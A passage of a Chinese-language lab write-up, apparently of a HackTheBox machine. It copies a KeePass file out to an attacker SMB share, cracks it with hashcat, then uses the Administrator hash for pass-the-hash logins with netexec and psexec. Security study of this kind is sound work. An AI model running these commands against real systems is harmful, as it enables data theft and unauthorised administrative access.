passwordhash进行破解

经过一番查找，终于在\kohsuke\documents找到一个CEH.kdbx文件，经过查找发现是一个密码数据库

```
#攻击端开启smb服务
sudo impacket-smbserver share . -smb2support
#被攻击端
copy CEH.kdbx \\10.10.16.17\share\CEH.kdbx
```

接着我们需要破解这个数据库文件的密钥

```
#优先破解数据库密码后生成hash
keepass2john CEH.kdbx > keepasshash
#针对hash进行明文破解
hashcat -m 13400 keepasshash /usr/share/wordlists/rockyou.txt
```

pass：moonshine1

使用kpcli进行连接，查找内容

```
kpcli --kdb CEH.kdbx
```

根据序号逐项查找对应内容，将所有的密码制作成密码字典后使用netexec进行破解，结果发现均失败，但第0条的值非常像hash

![](https://s2.loli.net/2024/10/05/xJ5YQ2EU8pyiVlS.png)Windows 将以 `LM Hash：NT Hash 格式`显示哈希。LM 是旧版 Windows 系统中使用的安全性低得多的哈希格式。它通常不使用，但为了向后兼容而保留。很多时候，会存储空白密码的 LM 哈希值，Windows 会忽略该哈希值，但允许该字段不为空。 `aad3b435b51404eeaad3b435b51404ee` 为空密码的 LM 哈希值。

由于window的身份验证方式，实际可以通过哈希进行密码身份验证

```
netexec smb 10.10.10.63 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

![image-20241005210733184](https://s2.loli.net/2024/10/05/OakQ56CIxqDGPgZ.png)

发现成功，同时这确定是管理员的哈希，（Pwn3d!）

```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63 cmd.exe
```
